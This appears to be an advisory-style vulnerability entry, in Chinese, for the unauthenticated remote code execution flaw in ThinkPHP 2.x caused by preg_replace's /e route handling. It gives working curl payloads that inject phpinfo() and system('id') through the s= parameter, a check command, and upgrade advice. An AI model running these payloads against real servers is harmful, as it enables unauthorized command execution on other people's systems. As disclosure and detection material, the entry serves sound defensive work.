---
id: THINKPHP-2-RCE
title: ThinkPHP 2.x 任意代码执行漏洞
product: thinkphp
vendor: ThinkPHP
version_affected: "2.x"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["ThinkPHP", "ThinkPHP 2.x"]
---

## 漏洞描述

ThinkPHP 是一个在中国被广泛使用的 PHP 框架。ThinkPHP 2.x 版本中，框架使用 `preg_replace` 的 `/e` 模式匹配路由，导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

## 影响版本

- ThinkPHP 2.x

## 前置条件

- 无需认证
- 目标使用 ThinkPHP 2.x

## 利用步骤

1. 通过 URL 参数注入 PHP 代码

## Payload

```bash
# 执行 phpinfo
curl "http://target:8080/index.php?s=/index/index/name/\${@phpinfo()}"

# 执行任意命令
curl "http://target:8080/index.php?s=/index/index/name/\${@system('id')}"
```

## 验证方法

```bash
# 检查 phpinfo 是否执行
curl -s "http://target:8080/index.php?s=/index/index/name/\${@phpinfo()}" | grep phpinfo
```

## 修复建议

1. 升级 ThinkPHP 至 3.x 或更高版本
2. 避免使用 ThinkPHP 2.x
3. 升级到最新版本的 ThinkPHP
